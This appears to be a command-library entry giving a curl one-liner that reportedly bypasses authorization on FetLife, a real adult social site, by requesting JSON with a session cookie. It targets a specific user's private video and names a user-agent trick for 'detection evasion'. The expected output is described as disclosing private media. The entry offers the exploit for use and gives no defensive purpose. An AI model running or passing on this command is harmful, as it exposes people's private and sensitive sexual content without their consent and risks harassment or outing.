---
id: ae1a3bd6-9719-494c-9910-6930331704a7
name: curl-fetlife-private-video-json
type: command
executor: bash
data: >-
  curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie:
  _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not
  cur1"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.445Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - exploit
  - http
  - authorization-bypass
  - fetlife
verified: false
validated: true
submitted: true
---

# curl-fetlife-private-video-json

## Command

```bash
curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## Description

Fetches private video JSON from FetLife, bypassing auth via Accept header. Ideal for exploiting known private video IDs with a session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (https://fetlife.com/users/14104003/videos/3102890) | Private video endpoint | Yes |
| -H "Cookie: _fl_sessionid={your-session}" | Auth session | Yes |
| -H "Accept: application/json" | JSON bypass trigger | Yes |
| --user-agent "not cur1" | Detection evasion | No |

## Examples

### Basic Usage

```bash
curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid=abc123" -H "Accept: application/json" --user-agent "not cur1"
```

### Advanced Usage

With output silencing errors:

```bash
curl -s https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## Expected Output

JSON: {"video":{"id":3102890,"embed_url":"https://...","description":"Private video","privacy":"friends"}}, disclosing private media.

## Related

- [[commands/curl-fetlife-private-picture-json]]
- [[procedures/Access-Private-FetLife-Videos-via-JSON]]
